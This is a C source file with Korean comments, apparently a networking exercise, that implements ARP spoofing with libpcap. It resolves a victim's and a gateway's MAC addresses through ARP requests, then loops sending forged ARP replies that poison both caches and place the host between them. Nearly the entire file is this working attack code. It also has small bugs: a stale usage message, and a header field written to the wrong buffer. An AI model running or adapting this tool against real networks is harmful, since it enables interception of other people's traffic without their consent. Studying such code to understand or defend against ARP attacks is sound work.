#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>


void usage() {
    printf("syntax: pcap-test <interface>\n");
    printf("sample: pcap-test wlan0\n");
}

typedef struct {
    char* dev_;
} Param;

Param param = {
    .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

#pragma pack(push,1)
typedef struct{

    uint8_t Destination_Mac_Address[6];
    uint8_t Source_Mac_Address[6];
    uint16_t Ether_Type;
}Network_Ethernet_header;

typedef struct{
    uint16_t Hardware_type;
    uint16_t Protocol_type;
    uint8_t Hardware_address_length;
    uint8_t Protocol_address_length;
    uint16_t Operation_code;
    uint8_t Source_hardware_address[6];
    uint8_t Source_protocol_address[4];
    uint8_t Target_hardware_address[6];
    uint8_t Target_protocol_address[4];
    uint8_t padding[18];
}ARP_PROTOCOL;
#pragma pack(pop)

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    struct ifreq ifr; // interface request의 약자로, 네트워크 인터페이스와 관련된 정보를 설정하거나 조회하는 목적으로 사용
    char ipstr[40];
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0); //  먼저 소켓을 생성 명령어 AF_INET은 IPv4, SOCK_DGRAM은 데이터그램 소켓, 0은 옵션 플레그 사용 안함
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ); // ifr.ifr_name에 네트워크 인터페이스의 이름을 복사

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { // SIOCGIFADDR은 소켓 인터페이스의 주소를 가져오는 명령어 성공하면 0 실패하면 음수를 반환 s는 소켓 디스크립터, SIOCGIFADDR는 IP를 가져오기 위한 명령어, &ifr는 구조체 포인터 인터페이스에 데이터를 저장하기 위해 사용
        printf("Error");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                  ipstr,sizeof(struct sockaddr)); // 이진 형태의 IP 주소를 텍스트 형태로 변환하고 ipstr에 저장합니다. AF_INET은 IPv4 주소 체계를 사용하고, ifr.ifr_addr.sa_data+2는 IP 주소의 시작 위치를 가리킵니다. 마지막으로 sizeof(struct sockaddr)는 ipstr 버퍼의 크기를 나타낸
    }

    uint8_t my_ip[4];
    sscanf(ipstr, "%hhu.%hhu.%hhu.%hhu", &my_ip[0], &my_ip[1], &my_ip[2], &my_ip[3]);


    // MAC 주소 가져오기
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ - 1); //  IFNAMSIZ 크기의 버퍼에 IFNAMSIZ 길이의 문자열을 복사하면 널 종료 문자를 넣을 공간이 없게 되어 오류날 수 있어 -1을 해야됨
    uint8_t my_mac[6];
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        return 1;
    }

    unsigned char *mac = (unsigned char*) ifr.ifr_hwaddr.sa_data;
    for (int i = 0; i < 6; i++)
    {
        my_mac[i] = mac[i];
     }

    // 소켓 닫기
    close(s);

    uint8_t target_mac[6];
    uint8_t target_gatewaymac[6];
    uint8_t target_ip[4];
    uint8_t target_gatewayip[4];

    //argv로 입력 받은 IP값 파싱

    sscanf(argv[2], "%hhu.%hhu.%hhu.%hhu", &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]);
    sscanf(argv[3], "%hhu.%hhu.%hhu.%hhu", &target_gatewayip[0], &target_gatewayip[1], &target_gatewayip[2], &target_gatewayip[3]);

    // target의 mac을 얻기 위한 arp request 패킷
    char packet_buffer[sizeof(Network_Ethernet_header) + sizeof(ARP_PROTOCOL)];
    Network_Ethernet_header * ethernet = (Network_Ethernet_header*)(packet_buffer);
    ARP_PROTOCOL *arp = (ARP_PROTOCOL*)(packet_buffer + sizeof(Network_Ethernet_header));

    for(int i = 0; i <6; i++)
        ethernet->Destination_Mac_Address[i] = 0xFF;
    for(int i = 0; i < 6; i++)
        ethernet->Source_Mac_Address[i] = my_mac[i];
    ethernet->Ether_Type = htons(0x806);

    arp->Hardware_type = htons(0x1);
    arp->Protocol_type = htons(0x800);
    arp->Hardware_address_length = 6;
    arp->Protocol_address_length = 4;
    arp->Operation_code = htons(0x01);

    for(int i = 0; i < 6; i++)
        arp->Source_hardware_address[i] = my_mac[i];
    for(int i = 0; i < 4; i++)
        arp->Source_protocol_address[i] = my_ip[i];
    for(int i = 0; i < 6; i++)
        arp->Target_hardware_address[i] = 0x00;
    for(int i = 0; i < 4; i++)
        arp->Target_protocol_address[i] = target_ip[i];
    for (int i = 0; i < 18; i++)
        arp->padding[i] = 0x00;

    pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));



    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        Network_Ethernet_header *check_mac_Ethernet = (Network_Ethernet_header*)packet;
        if (check_mac_Ethernet->Ether_Type != htons(0x806))
        {
            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }
        ARP_PROTOCOL *check_mac_arp = (ARP_PROTOCOL*)(packet + sizeof(Network_Ethernet_header));
        if (check_mac_arp->Operation_code != htons(0x0002))
        {
            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }

        if (
            check_mac_arp->Source_protocol_address[0] != target_ip[0] ||
            check_mac_arp->Source_protocol_address[1] != target_ip[1] ||
            check_mac_arp->Source_protocol_address[2] != target_ip[2] ||
            check_mac_arp->Source_protocol_address[3] != target_ip[3]
            )
        {
            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }

       // reply를 못 받을 경우 다시 request를 다시 보내 받기 위해 if문 안에 sendpacket 사용



        for (int i = 0; i < 6; i++)
            target_mac[i] = check_mac_Ethernet->Source_Mac_Address[i];
        break;

    }
    // arp request를 보내 얻은 target mac 주소를 출력
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);

     // target gateway의 mac을 얻기 위한 arp request 패킷

    for(int i = 0; i <6; i++)
        ethernet->Destination_Mac_Address[i] = 0xFF;
    for(int i = 0; i < 6; i++)
        ethernet->Source_Mac_Address[i] = my_mac[i];
    ethernet->Ether_Type = htons(0x806);

    arp->Hardware_type = htons(0x1);
    arp->Protocol_type = htons(0x800);
    arp->Hardware_address_length = 6;
    arp->Protocol_address_length = 4;
    arp->Operation_code = htons(0x01);

    for(int i = 0; i < 6; i++)
        arp->Source_hardware_address[i] = my_mac[i];
    for(int i = 0; i < 4; i++)
        arp->Source_protocol_address[i] = my_ip[i];
    for(int i = 0; i < 6; i++)
        arp->Target_hardware_address[i] = 0x00;
    for(int i = 0; i < 4; i++)
        arp->Target_protocol_address[i] = target_gatewayip[i];
    for (int i = 0; i < 18; i++)
        arp->padding[i] = 0x00;

    pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));


    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        Network_Ethernet_header *check_mac_Ethernet = (Network_Ethernet_header*)packet;
        if (check_mac_Ethernet->Ether_Type != htons(0x806))
        {
            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }

        ARP_PROTOCOL *check_mac_arp = (ARP_PROTOCOL*)(packet + sizeof(Network_Ethernet_header));
        if (check_mac_arp->Operation_code != htons(0x0002))
        {

            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }
        if (
            check_mac_arp->Source_protocol_address[0] != target_gatewayip[0] ||
            check_mac_arp->Source_protocol_address[1] != target_gatewayip[1] ||
            check_mac_arp->Source_protocol_address[2] != target_gatewayip[2] ||
            check_mac_arp->Source_protocol_address[3] != target_gatewayip[3]
            )
        {
            pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
            sleep(1);
            continue;
        }

        // reply를 못 받을 경우 다시 request를 다시 보내 받기 위해 if문 안에 sendpacket 사용

        for (int i = 0; i < 6; i++)
            target_gatewaymac[i] = check_mac_Ethernet->Source_Mac_Address[i];
        break;

    }

    // arp request를 보내 얻은 target gateway mac 주소를 출력
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n",target_gatewaymac[0],target_gatewaymac[1],target_gatewaymac[2],target_gatewaymac[3],target_gatewaymac[4],target_gatewaymac[5]);


    // arp spoofing을 하기 위헤 target에게 보낼 arp reply패킷
    Network_Ethernet_header * reply_ethernet1 = (Network_Ethernet_header*)(packet_buffer);
    ARP_PROTOCOL *reply_arp1 = (ARP_PROTOCOL*)(packet_buffer + sizeof(Network_Ethernet_header));


    for(int i = 0; i <6; i++)
        reply_ethernet1->Destination_Mac_Address[i] = target_mac[i];
    for(int i = 0; i < 6; i++)
        reply_ethernet1->Source_Mac_Address[i] = target_gatewaymac[i];
    reply_ethernet1->Ether_Type = htons(0x806);

    reply_arp1->Hardware_type = htons(0x1);
    reply_arp1->Protocol_type = htons(0x800);
    reply_arp1->Hardware_address_length = 6;
    reply_arp1->Protocol_address_length = 4;
    reply_arp1->Operation_code = htons(0x02);

    for(int i = 0; i < 6; i++)
        reply_arp1->Source_hardware_address[i] = my_mac[i];
    for(int i = 0; i < 4; i++)
        reply_arp1->Source_protocol_address[i] = target_gatewayip[i];
    for(int i = 0; i < 6; i++)
        reply_arp1->Target_hardware_address[i] = target_mac[i];
    for(int i = 0; i < 4; i++)
        reply_arp1->Target_protocol_address[i] = target_ip[i];
    for (int i = 0; i < 18; i++)
        reply_arp1->padding[i] = 0x00;


    // arp spoofing을 하기 위헤 target gateway에게 보낼 arp reply패킷

    char packet_buffer2[sizeof(Network_Ethernet_header) + sizeof(ARP_PROTOCOL)];

    Network_Ethernet_header * reply_ethernet2 = (Network_Ethernet_header*)(packet_buffer2);
    ARP_PROTOCOL *reply_arp2 = (ARP_PROTOCOL*)(packet_buffer2 + sizeof(Network_Ethernet_header));


    for(int i = 0; i <6; i++)
       reply_ethernet2->Destination_Mac_Address[i] = target_gatewaymac[i];
    for(int i = 0; i < 6; i++)
        reply_ethernet2->Source_Mac_Address[i] = target_mac[i];
    ethernet->Ether_Type = htons(0x806);

    reply_arp2->Hardware_type = htons(0x1);
    reply_arp2->Protocol_type = htons(0x800);
    reply_arp2->Hardware_address_length = 6;
    reply_arp2->Protocol_address_length = 4;
    reply_arp2->Operation_code = htons(0x02);

    for(int i = 0; i < 6; i++)
        reply_arp2->Source_hardware_address[i] = my_mac[i];
    for(int i = 0; i < 4; i++)
        reply_arp2->Source_protocol_address[i] = target_ip[i];
    for(int i = 0; i < 6; i++)
        reply_arp2->Target_hardware_address[i] = target_gatewaymac[i];
    for(int i = 0; i < 4; i++)
        reply_arp2->Target_protocol_address[i] = target_gatewayip[i];
    for (int i = 0; i < 18; i++)
        reply_arp2->padding[i] = 0x00;

    while(1)
    {
        // reply 패킷 전송
        pcap_sendpacket(pcap,packet_buffer,sizeof(packet_buffer));
        pcap_sendpacket(pcap,packet_buffer2,sizeof(packet_buffer2));
        printf("진행 중\n");
        sleep(1);
    }
    pcap_close(pcap);
}
